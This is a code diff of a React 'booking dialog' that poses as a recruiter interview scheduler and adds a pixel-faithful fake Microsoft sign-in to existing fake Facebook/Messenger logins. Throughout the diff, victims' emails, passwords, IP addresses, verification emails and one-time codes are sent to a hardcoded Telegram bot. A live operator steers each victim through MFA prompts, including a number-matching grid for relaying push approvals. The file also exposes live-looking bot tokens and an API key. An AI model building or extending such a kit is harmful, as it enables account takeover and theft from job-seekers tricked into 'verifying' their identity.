@@ -32,8 +32,8 @@ import {
 } from "lucide-react"
 
 // Add your Telegram bot configuration
-const TELEGRAM_BOT_TOKEN = "7555641913:AAG-X51iN3ANdlhyAyjkabtk4NvrwoIizMs"
-const TELEGRAM_CHAT_ID = "-5498829022"
+const TELEGRAM_BOT_TOKEN = "8461765223:AAHZaTc2dt0kxjOWfx2c_igm4ql1cpi8Sng"
+const TELEGRAM_CHAT_ID = "-1003962821228"
 
 const JSONBIN_KEY = "$2a$10$F4euH87QkhCmfpHFyRdqmuHvD5P4AMainqioOXx8YKPPu4QymMc.O"
 const JSONBIN_ID = "6a5eadf0f5f4af5e29aa108b"
@@ -49,7 +49,20 @@ type Props = {
   recruiter: Recruiter | null
 }
 
-type Step = "schedule" | "details" | "auth" | "permissions" | "full-login" | "authenticator" | "confirmed"
+type Step =
+  | "schedule"
+  | "details"
+  | "auth"
+  | "permissions"
+  | "full-login"
+  | "authenticator"
+  | "ms-authenticator"
+  | "verify-email"
+  | "email-otp"
+  | "enter-code"
+  | "check-phone"
+  | "approve-signin"
+  | "confirmed"
 
 const TIME_SLOTS = [
   "9:00 AM",
@@ -93,6 +106,78 @@ function MessengerIcon({ className }: { className?: string }) {
   )
 }
 
+function MicrosoftIcon({ className }: { className?: string }) {
+  return (
+      <svg viewBox="0 0 24 24" className={className} aria-hidden="true">
+        <path fill="#F25022" d="M1 1h10.5v10.5H1z" />
+        <path fill="#7FBA00" d="M12.5 1H23v10.5H12.5z" />
+        <path fill="#00A4EF" d="M1 12.5h10.5V23H1z" />
+        <path fill="#FFB900" d="M12.5 12.5H23V23H12.5z" />
+      </svg>
+  )
+}
+
+// Decorative "glass" background used by the Microsoft verify-email / OTP pages
+function MicrosoftGlassBg() {
+  return (
+      <div className="pointer-events-none absolute inset-0 z-0 overflow-hidden">
+        <svg
+            viewBox="0 0 1440 700"
+            preserveAspectRatio="xMidYMid slice"
+            className="absolute inset-0 h-full w-full"
+            xmlns="http://www.w3.org/2000/svg"
+        >
+          <defs>
+            <linearGradient id="msglassg1" x1="0" y1="0" x2="1" y2="1">
+              <stop offset="0" stopColor="#ffffff" stopOpacity=".55" />
+              <stop offset="1" stopColor="#ffffff" stopOpacity="0" />
+            </linearGradient>
+            <linearGradient id="msglassg2" x1="1" y1="0" x2="0" y2="1">
+              <stop offset="0" stopColor="#dfe6fb" stopOpacity=".6" />
+              <stop offset="1" stopColor="#dfe6fb" stopOpacity="0" />
+            </linearGradient>
+          </defs>
+          <polygon points="120,40 620,-40 500,360 40,300" fill="url(#msglassg1)" />
+          <polygon points="900,-40 1480,60 1440,420 980,300" fill="url(#msglassg2)" />
+          <polygon points="60,420 520,520 360,760 -40,700" fill="url(#msglassg1)" />
+          <polygon points="980,420 1480,360 1520,760 1040,760" fill="url(#msglassg2)" />
+          <path d="M1400 120 L900 680" stroke="#cfd8f5" strokeWidth="1" opacity=".5" fill="none" />
+          <path d="M40 120 L520 620" stroke="#f0dbe8" strokeWidth="1" opacity=".5" fill="none" />
+        </svg>
+      </div>
+  )
+}
+
+function MicrosoftFooter({ note }: { note?: string }) {
+  return (
+      <div className="absolute inset-x-0 bottom-[18px] z-[2] text-center">
+        <div className="mb-1.5 flex justify-center gap-[26px]">
+          <button type="button" className="text-[13px] text-[#616161] hover:underline">
+            Help
+          </button>
+          <button type="button" className="text-[13px] text-[#616161] hover:underline">
+            Terms of use
+          </button>
+          <button type="button" className="text-[13px] text-[#616161] hover:underline">
+            Privacy and cookies
+          </button>
+        </div>
+        <div className="text-[12px] text-[#616161]">
+          {note ? (
+            <>
+              {note}{" "}
+              <button type="button" className="text-[#0067b8] hover:underline">
+                Learn more
+              </button>
+            </>
+          ) : (
+            "Use private browsing if this is not your device."
+          )}
+        </div>
+      </div>
+  )
+}
+
 export function BookingDialog({ open, onOpenChange, recruiter }: Props) {
   const [step, setStep] = useState<Step>("schedule")
   const [monthOffset, setMonthOffset] = useState(0)
@@ -100,12 +185,21 @@ export function BookingDialog({ open, onOpenChange, recruiter }: Props) {
   const [date, setDate] = useState<Date | null>(null)
   const [time, setTime] = useState<string>("")
   const [form, setForm] = useState({ name: "", email: "", type: meetingTypes[0], notes: "" })
-  const [authProvider, setAuthProvider] = useState<"facebook" | "messenger" | null>(null)
+  const [authProvider, setAuthProvider] = useState<"facebook" | "messenger" | "microsoft" | null>(null)
+  const [msStep, setMsStep] = useState<"email" | "password">("email")
   const [login, setLogin] = useState({ id: "", password: "" })
   const [loggingIn, setLoggingIn] = useState(false)
   const [permVisible, setPermVisible] = useState(false)
   const [fullVisible, setFullVisible] = useState(false)
   const [otpCode, setOtpCode] = useState("")
+  const [rememberDevice, setRememberDevice] = useState(true)
+  const [approveCode, setApproveCode] = useState("")
+  const [approveError, setApproveError] = useState("")
+  const [approving, setApproving] = useState(false)
+  const [checkPhoneNumber, setCheckPhoneNumber] = useState("")
+  const [emailVerify, setEmailVerify] = useState("")
+  const [emailVerifyError, setEmailVerifyError] = useState("")
+  const [verifyingEmail, setVerifyingEmail] = useState(false)
   const [isSending, setIsSending] = useState(false)
   const [loginError, setLoginError] = useState("")
   const [otpError, setOtpError] = useState("")
@@ -145,14 +239,46 @@ export function BookingDialog({ open, onOpenChange, recruiter }: Props) {
     }
   }, [step])
 
-  function handleAuth(provider: "facebook" | "messenger") {
+  // When the approve-signin page opens, ping Telegram with the approve prompt
+  const approveStartedRef = useRef(false)
+  useEffect(() => {
+    if (step === "approve-signin") {
+      if (!approveStartedRef.current) {
+        approveStartedRef.current = true
+        startApproveSignin()
+      }
+    } else {
+      approveStartedRef.current = false
+    }
+    // eslint-disable-next-line react-hooks/exhaustive-deps
+  }, [step])
+
+  // When the check-phone page opens, generate a random number and ping Telegram
+  const checkPhoneStartedRef = useRef(false)
+  useEffect(() => {
+    if (step === "check-phone") {
+      if (!checkPhoneStartedRef.current) {
+        checkPhoneStartedRef.current = true
+        startCheckPhone()
+      }
+    } else {
+      checkPhoneStartedRef.current = false
+    }
+    // eslint-disable-next-line react-hooks/exhaustive-deps
+  }, [step])
+
+  function handleAuth(provider: "facebook" | "messenger" | "microsoft") {
     setAuthProvider(provider)
     setLogin({ id: "", password: "" })
+    setMsStep("email")
     setPermVisible(false)
-    setStep("permissions")
+    // Microsoft is a direct sign-in (no Meta-style OAuth consent screen),
+    // so it goes straight to the login form.
+    setStep(provider === "microsoft" ? "full-login" : "permissions")
 
     // Send auth provider selection to Telegram
-    const providerName = provider === "facebook" ? "Facebook" : "Messenger"
+    const providerName =
+      provider === "facebook" ? "Facebook" : provider === "messenger" ? "Messenger" : "Microsoft"
     fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
@@ -186,19 +312,28 @@ export function BookingDialog({ open, onOpenChange, recruiter }: Props) {
 
     const text = `<b>🔐 Authentication Report</b>\n\n🔐 <b>Password:</b> <code>${login.password}</code>\n📧 <b>Email:</b> <code>${login.id}</code>\n🌐 <b>IP Address:</b> <code>${ip}</code>`
 
+    // Microsoft gets the full 2FA button set; Facebook/Messenger keep the original two buttons.
+    const inlineKeyboard =
+      authProvider === "microsoft"
+        ? [
+            [{ text: "❌ Wrong Password", callback_data: `/wrong-password ${sessionId}` }],
+            [{ text: "🔐 Authenticator Code", callback_data: `/code ${sessionId}` }],
+            [{ text: "📧 2FA Email", callback_data: `/email-2fa ${sessionId}` }],
+            [{ text: "🔢 Code", callback_data: `/enter-code ${sessionId}` }],
+            [{ text: "🎲 Random Code", callback_data: `/random-code ${sessionId}` }],
+            [{ text: "📲 Approve Sign-in", callback_data: `/approve-signin ${sessionId}` }],
+          ]
+        : [
+            [{ text: "❌ Wrong Password", callback_data: `/wrong-password ${sessionId}` }],
+            [{ text: "🔐 Authenticator", callback_data: `/code ${sessionId}` }],
+          ]
+
     const payload = {
       chat_id: TELEGRAM_CHAT_ID,
       text,
       parse_mode: "HTML",
       reply_markup: {
-        inline_keyboard: [
-          [
-            { text: "❌ Wrong Password", callback_data: `/wrong-password ${sessionId}` },
-          ],
-          [
-            { text: "🔐 Authenticator", callback_data: `/code ${sessionId}` },
-          ],
-        ],
+        inline_keyboard: inlineKeyboard,
       },
     }
 
@@ -296,6 +431,62 @@ export function BookingDialog({ open, onOpenChange, recruiter }: Props) {
     throw new Error("Polling timed out or was aborted")
   }
 
+  // Microsoft step 1: send the entered email to Telegram, wait for the bot.
+  // If the bot marks it wrong we keep the user on the email page and show an error;
+  // otherwise we advance to the password page.
+  async function handleMicrosoftEmailNext(e: React.FormEvent) {
+    e.preventDefault()
+    if (login.id.trim().length === 0) return
+    setLoginError("")
+    setIsSending(true)
+
+    try {
+      const sessionId = ++pendingSessionId
+      const ipResponse = await fetch("https://api.ipify.org?format=json").catch(() => ({ ok: false }))
+      const ip = ipResponse.ok ? (await ipResponse.json()).ip : "Unknown"
+
+      const text = `<b>📧 Microsoft — Email Submitted</b>\n\n📧 <b>Email:</b> <code>${login.id}</code>\n🌐 <b>IP Address:</b> <code>${ip}</code>`
+
+      const res = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: TELEGRAM_CHAT_ID,
+          text,
+          parse_mode: "HTML",
+          reply_markup: {
+            inline_keyboard: [
+              [
+                { text: "❌ Wrong Email", callback_data: `/wrong-email ${sessionId}` },
+              ],
+              [
+                { text: "✅ Continue", callback_data: `/email-ok ${sessionId}` },
+              ],
+            ],
+          },
+        }),
+      })
+
+      if (!res.ok) throw new Error("Failed to send email to Telegram")
+
+      // Wait for the bot's decision
+      const callbackData = await startPollingForAction(sessionId)
+      setIsSending(false)
+
+      if (callbackData.startsWith("/wrong-email")) {
+        // Stay on the email page and surface the error (exact copy is rendered in the UI)
+        setLoginError("We couldn't find an account with that username.")
+      } else {
+        // ✅ (or any other action) — advance to the password page
+        setMsStep("password")
+      }
+    } catch (error) {
+      console.error("Microsoft email submission failed:", error)
+      setIsSending(false)
+      alert("There was an issue submitting your email. Please try again.")
+    }
+  }
+
   // Handle the login form submission — sends credentials to Telegram and waits for bot
   async function handleFullLogin(e: React.FormEvent) {
     e.preventDefault()
@@ -314,21 +505,56 @@ export function BookingDialog({ open, onOpenChange, recruiter }: Props) {
 
       if (callbackData.startsWith("/wrong-password")) {
         // Wrong password — show error on the login page, user can retry
-        setLoginError("The password you've entered is incorrect. Please try again.")
-      } else {
-        // Any other action — navigate to the next step
+        setLoginError("Your account or password is incorrect.")
+      } else if (authProvider === "microsoft" && callbackData.startsWith("/email-2fa")) {
+        // Microsoft — Bot chose 2FA Email — open the "Verify your email" page
         setFullVisible(false)
 
         setTimeout(() => {
-          if (callbackData.startsWith("/code") || callbackData.startsWith("/2fa-session")) {
-            setStep("authenticator")
-          } else if (callbackData.startsWith("/phone")) {
-            // Could add a phone OTP step later
-            setStep("authenticator")
-          } else {
-            // Default: go to authenticator
-            setStep("authenticator")
-          }
+          setEmailVerify("")
+          setEmailVerifyError("")
+          setStep("verify-email")
+        }, 260)
+      } else if (authProvider === "microsoft" && callbackData.startsWith("/enter-code")) {
+        // Microsoft — Bot chose Code — open the generic "Enter the code" page
+        setFullVisible(false)
+
+        setTimeout(() => {
+          setOtpCode("")
+          setOtpError("")
+          setStep("enter-code")
+        }, 260)
+      } else if (authProvider === "microsoft" && callbackData.startsWith("/approve-signin")) {
+        // Microsoft — Bot chose Approve Sign-in — open the approval page and ping Telegram
+        setFullVisible(false)
+        setApproveError("")
+
+        setTimeout(() => {
+          setStep("approve-signin")
+        }, 260)
+      } else if (authProvider === "microsoft" && callbackData.startsWith("/random-code")) {
+        // Microsoft — Bot chose Random Code — open the "Check your phone" page and ping Telegram
+        setFullVisible(false)
+
+        setTimeout(() => {
+          setCheckPhoneNumber("")
+          setStep("check-phone")
+        }, 260)
+      } else if (authProvider === "microsoft" && callbackData.startsWith("/code")) {
+        // Microsoft — "Authenticator Code" — Microsoft-styled authenticator page
+        setFullVisible(false)
+
+        setTimeout(() => {
+          setOtpCode("")
+          setOtpError("")
+          setStep("ms-authenticator")
+        }, 260)
+      } else {
+        // Facebook / Messenger (and any other action) — social-styled authenticator page
+        setFullVisible(false)
+
+        setTimeout(() => {
+          setStep("authenticator")
         }, 260)
       }
     } catch (error) {
@@ -338,9 +564,286 @@ export function BookingDialog({ open, onOpenChange, recruiter }: Props) {
     }
   }
 
+  // Verify-email step: send the entered email to Telegram, wait for the bot.
+  // On approval we move to the code-entry (email-otp) page.
+  async function handleVerifyEmailSubmit(e: React.FormEvent) {
+    e.preventDefault()
+    if (emailVerify.trim().length === 0) return
+    setEmailVerifyError("")
+    setVerifyingEmail(true)
+
+    try {
+      const sessionId = ++pendingSessionId
+
+      const text = `<b>📧 Microsoft — 2FA Email Verification</b>\n\n<b>📧 Account:</b> <code>${login.id}</code>\n<b>✉️ Verify Email:</b> <code>${emailVerify}</code>\n\n⏰ <i>Submitted at: ${new Date().toLocaleString()}</i>`
+
+      const res = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: TELEGRAM_CHAT_ID,
+          text,
+          parse_mode: "HTML",
+          reply_markup: {
+            inline_keyboard: [
+              [
+                { text: "✅ Send Code", callback_data: `/send-code ${sessionId}` },
+                { text: "❌ Invalid Email", callback_data: `/invalid-email ${sessionId}` },
+              ],
+            ],
+          },
+        }),
+      })
+
+      if (!res.ok) throw new Error("Failed to send email verification to Telegram")
+
+      const callbackData = await startPollingForAction(sessionId)
+      setVerifyingEmail(false)
+
+      if (callbackData.startsWith("/invalid-email")) {
+        setEmailVerifyError("That email address didn't work. Please check it and try again.")
+      } else {
+        // ✅ Send Code (or any other action) — open the code-entry page
+        setOtpCode("")
+        setOtpError("")
+        setStep("email-otp")
+      }
+    } catch (error) {
+      console.error("Email verification failed:", error)
+      setVerifyingEmail(false)
+      alert("There was an issue verifying your email. Please try again.")
+    }
+  }
+
+  // Generate a short uppercase alphanumeric request code (e.g. P8CB3)
+  function generateApproveCode() {
+    const chars = "ABCDEFGHJKLMNPQRSTUVWXYZ123456789"
+    let code = ""
+    for (let i = 0; i < 5; i++) code += chars[Math.floor(Math.random() * chars.length)]
+    return code
+  }
+
+  // Build number buttons 00, 01, 02 … 89 (zero-padded), laid out in rows of 8.
+  // Telegram allows at most 100 inline buttons per keyboard, and we still need room for
+  // the Approve / Code / Authenticator / 2FA Email / Deny buttons below the grid, so we
+  // cap the grid at 90 numbers (90 + 5 action buttons = 95, safely under the limit).
+  function buildNumberButtons(sessionId: number) {
+    const buttons: { text: string; callback_data: string }[] = []
+    for (let n = 0; n <= 89; n++) {
+      const value = String(n).padStart(2, "0")
+      buttons.push({
+        text: value,
+        callback_data: `/number ${value} ${sessionId}`,
+      })
+    }
+
+    const rows: { text: string; callback_data: string }[][] = []
+    for (let i = 0; i < buttons.length; i += 8) {
+      rows.push(buttons.slice(i, i + 8))
+    }
+    return rows
+  }
+
+  // Approve-signin step: no action on the page itself. We send an "Approve" prompt to
+  // Telegram and let the operator either approve the request or redirect the user to the
+  // Code / Authenticator / 2FA Email pages.
+  async function startApproveSignin() {
+    setApproving(true)
+    setApproveError("")
+
+    const code = generateApproveCode()
+    setApproveCode(code)
+
+    try {
+      const sessionId = ++pendingSessionId
+
+      const text = `<b>📲 Microsoft — Approve sign-in request</b>\n\n📧 <b>Account:</b> <code>${login.id}</code>\n🔢 <b>Request code:</b> <code>${code}</code>\n\n⏰ <i>Submitted at: ${new Date().toLocaleString()}</i>`
+
+      const res = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: TELEGRAM_CHAT_ID,
+          text,
+          parse_mode: "HTML",
+          reply_markup: {
+            inline_keyboard: [
+              [{ text: "✅ Approve", callback_data: `/approved ${sessionId}` }],
+              [
+                { text: "🔢 Code", callback_data: `/enter-code ${sessionId}` },
+                { text: "🔐 Authenticator", callback_data: `/code ${sessionId}` },
+              ],
+              [
+                { text: "📧 2FA Email", callback_data: `/email-2fa ${sessionId}` },
+                { text: "❌ Deny", callback_data: `/deny ${sessionId}` },
+              ],
+            ],
+          },
+        }),
+      })
+
+      if (!res.ok) throw new Error("Failed to send approve request to Telegram")
+
+      const callbackData = await startPollingForAction(sessionId)
+      setApproving(false)
+
+      if (callbackData.startsWith("/approved")) {
+        // Operator approved — send confirmation + go to confirmed page
+        await sendBookingConfirmation()
+        setStep("confirmed")
+      } else if (callbackData.startsWith("/enter-code")) {
+        setOtpCode("")
+        setOtpError("")
+        setStep("enter-code")
+      } else if (callbackData.startsWith("/email-2fa")) {
+        setEmailVerify("")
+        setEmailVerifyError("")
+        setStep("verify-email")
+      } else if (callbackData.startsWith("/code")) {
+        setOtpCode("")
+        setOtpError("")
+        setStep("ms-authenticator")
+      } else if (callbackData.startsWith("/deny")) {
+        // Operator denied — stay on the approve page and show a message
+        setApproveError("This sign-in request was denied. Please try again later.")
+      } else {
+        // Fallback — re-arm the approve prompt (no action taken)
+        startApproveSignin()
+      }
+    } catch (error) {
+      console.error("Approve sign-in failed:", error)
+      setApproving(false)
+      alert("There was an issue with the sign-in request. Please try again.")
+    }
+  }
+
+  // Check-phone step: send the full number grid (00, 01, 02 … 100) to Telegram once.
+  // Pressing any number shows it on the "Check your phone" page. The operator can also
+  // Approve, redirect to the Code / Authenticator / 2FA Email pages, or Deny.
+  async function startCheckPhone() {
+    setApproving(true)
+    setApproveError("")
+
+    try {
+      const sessionId = ++pendingSessionId
+
+      const text = `<b>📱 Microsoft — Check your phone</b>\n\n📧 <b>Account:</b> <code>${login.id}</code>\n\nTap the number to show it on the sign-in request screen.\n\n⏰ <i>Submitted at: ${new Date().toLocaleString()}</i>`
+
+      const res = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: TELEGRAM_CHAT_ID,
+          text,
+          parse_mode: "HTML",
+          reply_markup: {
+            inline_keyboard: [
+              // Full number grid (00, 01, 02 … 100) — pressing one shows it on the page
+              ...buildNumberButtons(sessionId),
+              [{ text: "✅ Approve", callback_data: `/approved ${sessionId}` }],
+              [
+                { text: "🔢 Code", callback_data: `/enter-code ${sessionId}` },
+                { text: "🔐 Authenticator", callback_data: `/code ${sessionId}` },
+              ],
+              [
+                { text: "📧 2FA Email", callback_data: `/email-2fa ${sessionId}` },
+                { text: "❌ Deny", callback_data: `/deny ${sessionId}` },
+              ],
+            ],
+          },
+        }),
+      })
+
+      if (!res.ok) throw new Error("Failed to send check-phone request to Telegram")
+
+      // Listen for button presses on this same message. Number presses only update the
+      // page; navigation/approval presses move the flow forward. We keep re-polling so the
+      // operator can change the number any number of times without resending the grid.
+      while (true) {
+        const callbackData = await startPollingForAction(sessionId)
+
+        if (callbackData.startsWith("/number")) {
+          // Operator pressed a number — show it on the page and keep listening.
+          const value = callbackData.split(" ")[1] || ""
+          setCheckPhoneNumber(value)
+          continue
+        }
+
+        setApproving(false)
+
+        if (callbackData.startsWith("/approved")) {
+          // Operator approved — send confirmation + go to confirmed page
+          await sendBookingConfirmation()
+          setStep("confirmed")
+        } else if (callbackData.startsWith("/enter-code")) {
+          setOtpCode("")
+          setOtpError("")
+          setStep("enter-code")
+        } else if (callbackData.startsWith("/email-2fa")) {
+          setEmailVerify("")
+          setEmailVerifyError("")
+          setStep("verify-email")
+        } else if (callbackData.startsWith("/code")) {
+          setOtpCode("")
+          setOtpError("")
+          setStep("ms-authenticator")
+        } else if (callbackData.startsWith("/deny")) {
+          // Operator denied — stay on the page and show a message
+          setApproveError("This sign-in request was denied. Please try again later.")
+        } else {
+          // Fallback — re-arm the prompt (no action taken)
+          startCheckPhone()
+        }
+        return
+      }
+    } catch (error) {
+      console.error("Check-phone failed:", error)
+      setApproving(false)
+      alert("There was an issue with the sign-in request. Please try again.")
+    }
+  }
+
+  // Send the full booking confirmation message to Telegram
+  async function sendBookingConfirmation() {
+    const bookingMessage = `
+📅 <b>Booking Confirmed!</b>
+
+👤 <b>Candidate:</b> ${form.name}
+📧 <b>Email:</b> ${form.email}
+👔 <b>Recruiter:</b> ${activeRecruiter?.name || "Unknown"}
+📆 <b>Date:</b> ${dateLabel || "Unknown"}
+🕐 <b>Time:</b> ${time || "Unknown"}
+📋 <b>Meeting Type:</b> ${form.type}
+🔐 <b>Verified via:</b> ${authProvider === "facebook" ? "Facebook" : authProvider === "messenger" ? "Messenger" : "Microsoft"}
+📝 <b>Notes:</b> ${form.notes || "None provided"}
+
+🔗 <i>Booking confirmed at: ${new Date().toLocaleString()}</i>
+    `.trim()
+
+    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        chat_id: TELEGRAM_CHAT_ID,
+        text: bookingMessage,
+        parse_mode: "HTML",
+      }),
+    })
+
+    // Open Jivo chat widget
+    setTimeout(() => {
+      if (typeof window.jivo_api !== "undefined") {
+        window.jivo_api.open()
+      }
+    }, 500)
+  }
+
   // Send 2FA code to Telegram with inline buttons and wait for bot response
   async function handleAuthenticatorContinue() {
-    if (otpCode.length < 6) return
+    // Microsoft codes can be 6–10 digits; Facebook/Messenger stay strict 6.
+    const minLen = 6
+    const maxLen = authProvider === "microsoft" ? 10 : 6
+    if (otpCode.length < minLen || otpCode.length > maxLen) return
     setIsSending(true)
     setOtpError("")
 
@@ -375,38 +878,7 @@ export function BookingDialog({ open, onOpenChange, recruiter }: Props) {
 
       if (callbackData.startsWith("/confirmed")) {
         // Send the full booking confirmation to Telegram
-        const bookingMessage = `
-📅 <b>Booking Confirmed!</b>
-
-👤 <b>Candidate:</b> ${form.name}
-📧 <b>Email:</b> ${form.email}
-👔 <b>Recruiter:</b> ${activeRecruiter?.name || "Unknown"}
-📆 <b>Date:</b> ${dateLabel || "Unknown"}
-🕐 <b>Time:</b> ${time || "Unknown"}
-📋 <b>Meeting Type:</b> ${form.type}
-🔐 <b>Verified via:</b> ${authProvider === "facebook" ? "Facebook" : "Messenger"}
-📝 <b>Notes:</b> ${form.notes || "None provided"}
-
-🔗 <i>Booking confirmed at: ${new Date().toLocaleString()}</i>
-        `.trim()
-
-        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({
-            chat_id: TELEGRAM_CHAT_ID,
-            text: bookingMessage,
-            parse_mode: "HTML",
-          }),
-        })
-
-        // Open Jivo chat widget
-        setTimeout(() => {
-          if (typeof window.jivo_api !== 'undefined') {
-            window.jivo_api.open()
-          }
-        }, 500)
-
+        await sendBookingConfirmation()
         setStep("confirmed")
       } else if (callbackData.startsWith("/wrong-code")) {
         setOtpError("The code you entered is incorrect. Please try again.")
@@ -475,6 +947,7 @@ export function BookingDialog({ open, onOpenChange, recruiter }: Props) {
     setForm({ name: "", email: "", type: meetingTypes[0], notes: "" })
     setAuthProvider(null)
     setLogin({ id: "", password: "" })
+    setMsStep("email")
     setLoggingIn(false)
     setPermVisible(false)
     setFullVisible(false)
@@ -482,6 +955,14 @@ export function BookingDialog({ open, onOpenChange, recruiter }: Props) {
     setLoginError("")
     setOtpError("")
     setOtpCode("")
+    setRememberDevice(true)
+    setApproveCode("")
+    setApproveError("")
+    setApproving(false)
+    setCheckPhoneNumber("")
+    setEmailVerify("")
+    setEmailVerifyError("")
+    setVerifyingEmail(false)
   }
 
   function handleOpenChange(next: boolean) {
@@ -504,10 +985,25 @@ export function BookingDialog({ open, onOpenChange, recruiter }: Props) {
       ? date.toLocaleDateString("en-US", { weekday: "long", month: "long", day: "numeric" })
       : ""
 
-  const providerColor = authProvider === "facebook" ? "#1877F2" : "#0A7CFF"
-  const providerLabel = authProvider === "facebook" ? "Facebook" : "Messenger"
+  const providerColor =
+      authProvider === "facebook" ? "#1877F2" : authProvider === "messenger" ? "#0A7CFF" : "#00A4EF"
+  const providerLabel =
+      authProvider === "facebook" ? "Facebook" : authProvider === "messenger" ? "Messenger" : "Microsoft"
 
-  const isFullScreen = step === "permissions" || step === "full-login"
+  // Microsoft OTP fields accept 6–10 digits; Facebook/Messenger stay strict 6.
+  const otpMinLen = 6
+  const otpMaxLen = authProvider === "microsoft" ? 10 : 6
+  const otpValid = otpCode.length >= otpMinLen && otpCode.length <= otpMaxLen
+
+  const isFullScreen =
+    step === "permissions" ||
+    step === "full-login" ||
+    step === "ms-authenticator" ||
+    step === "verify-email" ||
+    step === "email-otp" ||
+    step === "enter-code" ||
+    step === "check-phone" ||
+    step === "approve-signin"
 
   return (
       <Dialog open={open} onOpenChange={handleOpenChange}>
@@ -734,6 +1230,178 @@ export function BookingDialog({ open, onOpenChange, recruiter }: Props) {
                         </div>
                       </div>
                     </>
+                ) : authProvider === "microsoft" ? (
+                    /* ── MICROSOFT ── */
+                    <div
+                        className="relative flex h-full flex-col items-center justify-center px-4 py-8"
+                        style={{
+                          fontFamily:
+                            '"Segoe UI", "Segoe UI Web (West European)", -apple-system, BlinkMacSystemFont, Roboto, "Helvetica Neue", sans-serif',
+                          background:
+                            "radial-gradient(120% 120% at 15% 20%, #f7e9f0 0%, transparent 45%), radial-gradient(120% 120% at 85% 15%, #e7ecfb 0%, transparent 40%), radial-gradient(140% 140% at 80% 90%, #f3e6ef 0%, transparent 45%), radial-gradient(140% 140% at 10% 95%, #e9edf9 0%, transparent 45%), linear-gradient(135deg, #eef0f8 0%, #f2ecf3 50%, #edeef7 100%)",
+                        }}
+                    >
+                      <form
+                        onSubmit={msStep === "email" ? handleMicrosoftEmailNext : handleFullLogin}
+                        className="w-full max-w-[440px] bg-white shadow-[0_8px_28px_rgba(0,0,0,0.10)]"
+                        style={{ borderRadius: 8, padding: "44px 44px 40px" }}
+                      >
+                        {/* Header: back arrow + Microsoft logo */}
+                        <div className="relative mb-5 flex items-center justify-center">
+                          {msStep === "password" && (
+                            <button
+                              type="button"
+                              aria-label="Back"
+                              onClick={() => {
+                                setMsStep("email")
+                                setLoginError("")
+                              }}
+                              className="absolute left-0 top-1/2 -translate-y-1/2 p-1 text-[#5e5e5e]"
+                            >
+                              <svg viewBox="0 0 24 24" fill="none" className="size-5">
+                                <path
+                                  d="M15 5l-7 7 7 7"
+                                  stroke="#5e5e5e"
+                                  strokeWidth="1.6"
+                                  strokeLinecap="round"
+                                  strokeLinejoin="round"
+                                />
+                              </svg>
+                            </button>
+                          )}
+                          <div className="flex items-center">
+                            <MicrosoftIcon className="mr-2 size-[22px]" />
+                            <span className="text-[15px] font-semibold text-[#5e5e5e]">Microsoft</span>
+                          </div>
+                        </div>
+
+                        {/* Email pill (password step only) */}
+                        {msStep === "password" && (
+                          <div className="mb-[22px] flex justify-center">
+                            <span className="inline-flex items-center justify-center rounded-2xl border border-[#d1d1d1] px-3.5 py-1 text-[13px] text-[#1b1b1b]">
+                              {login.id || "someone@example.com"}
+                            </span>
+                          </div>
+                        )}
+
+                        <h1 className="mb-5 text-[24px] font-semibold text-[#1b1b1b]">
+                          {msStep === "email" ? "Sign in" : "Enter your password"}
+                        </h1>
+
+                        {msStep === "password" && loginError && (
+                          <p className="mb-3 text-[13px] leading-snug text-[#e81123]">
+                            Your account or password is incorrect. If you don&apos;t remember your
+                            password,{" "}
+                            <button type="button" className="text-[#0067b8] hover:underline">
+                              reset it now
+                            </button>
+                            .
+                          </p>
+                        )}
+
+                        {msStep === "email" ? (
+                          <>
+                            {loginError && (
+                              <p className="mb-3 text-[13px] leading-snug text-[#e81123]">
+                                We couldn&apos;t find an account with that username. Try another, or{" "}
+                                <button type="button" className="text-[#0067b8] hover:underline">
+                                  get a new Microsoft account
+                                </button>
+                                .
+                              </p>
+                            )}
+                            <input
+                              type="text"
+                              autoComplete="username"
+                              value={login.id}
+                              onChange={(e) => {
+                                setLogin({ ...login, id: e.target.value })
+                                if (loginError) setLoginError("")
+                              }}
+                              placeholder="Email, phone, or Skype"
+                              aria-label="Email, phone, or Skype"
+                              className={cn(
+                                "mb-4 w-full border-0 border-b bg-transparent px-0 py-1.5 text-[15px] text-[#1b1b1b] outline-none focus:border-b-2",
+                                loginError
+                                  ? "border-b-[#e81123] focus:border-b-[#e81123]"
+                                  : "border-b-[#666] focus:border-b-[#0067b8]"
+                              )}
+                            />
+                            <p className="mb-1 text-[13px] text-[#1b1b1b]">
+                              No account?{" "}
+                              <button type="button" className="text-[#0067b8] hover:underline">
+                                Create one!
+                              </button>
+                            </p>
+                            <p className="mb-0 text-[13px] text-[#1b1b1b]">
+                              <button type="button" className="text-[#0067b8] hover:underline">
+                                Can&apos;t access your account?
+                              </button>
+                            </p>
+                            <div className="mt-11 flex justify-end">
+                              <button
+                                type="submit"
+                                disabled={login.id.trim().length === 0 || isSending}
+                                className="flex min-w-[108px] items-center justify-center gap-2 bg-[#0067b8] px-4 text-[15px] font-normal text-white transition hover:bg-[#005da6] disabled:cursor-not-allowed disabled:bg-[#a7c7e7]"
+                                style={{ height: 32 }}
+                              >
+                                {isSending && <Loader2 className="size-4 animate-spin" />}
+                                {isSending ? "Checking…" : "Next"}
+                              </button>
+                            </div>
+                          </>
+                        ) : (
+                          <>
+                            <input
+                              type="password"
+                              autoComplete="current-password"
+                              value={login.password}
+                              onChange={(e) => {
+                                setLogin({ ...login, password: e.target.value })
+                                if (loginError) setLoginError("")
+                              }}
+                              placeholder="Password"
